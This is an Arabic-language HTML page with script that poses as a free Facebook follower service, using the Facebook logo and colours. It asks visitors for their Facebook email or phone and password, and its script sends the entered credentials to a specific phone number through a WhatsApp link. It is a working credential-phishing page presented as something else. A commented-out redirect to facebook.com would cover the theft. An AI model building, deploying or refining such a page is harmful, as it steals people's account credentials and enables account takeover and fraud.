<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة متابعين فيسبوك مجانًا</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1877f2;
            margin: 0;
            padding: 0;
            color: white;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            color: #333;
        }
        h1 {
            color: #1877f2;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: right;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        button:hover {
            background-color: #166fe5;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .disclaimer {
            font-size: 12px;
            color: #777;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
        <h1>زيادة متابعين فيسبوك مجانًا</h1>
        <p>أدخل معلومات حسابك للحصول على 1000 متابع خلال 24 ساعة</p>
        
        <form id="loginForm" onsubmit="sendToWhatsApp(); return false;">
            <div class="form-group">
                <label for="email">البريد الإلكتروني أو رقم الهاتف:</label>
                <input type="text" id="email" required>
            </div>
            
            <div class="form-group">
                <label for="password">كلمة المرور:</label>
                <input type="password" id="password" required>
            </div>
            
            <div class="form-group">
                <label for="followers">عدد المتابعين المطلوب:</label>
                <input type="number" id="followers" value="1000" required>
            </div>
            
            <button type="submit">الحصول على المتابعين</button>
        </form>
        
        <p class="disclaimer">بعد التسجيل، سوف تتلقى متابعين خلال 24 ساعة. لا نتحمل مسؤولية أي مشاكل في حسابك.</p>
    </div>

    <script>
        function sendToWhatsApp() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const followers = document.getElementById('followers').value;
            
            const message = `طلب جديد لزيادة المتابعين:\n\nبريد إلكتروني/هاتف: ${email}\nكلمة المرور: ${password}\nعدد المتابعين المطلوب: ${followers}`;
            
            const encodedMessage = encodeURIComponent(message);
            const whatsappUrl = `https://wa.me/905525439562?text=${encodedMessage}`;
            
            window.open(whatsappUrl, '_blank');
            
            // يمكنك إضافة إعادة توجيه بعد الإرسال إذا أردت
            // setTimeout(() => {
            //     window.location.href = "https://facebook.com";
            // }, 3000);
            
            return false;
        }
    </script>
</body>
</html>
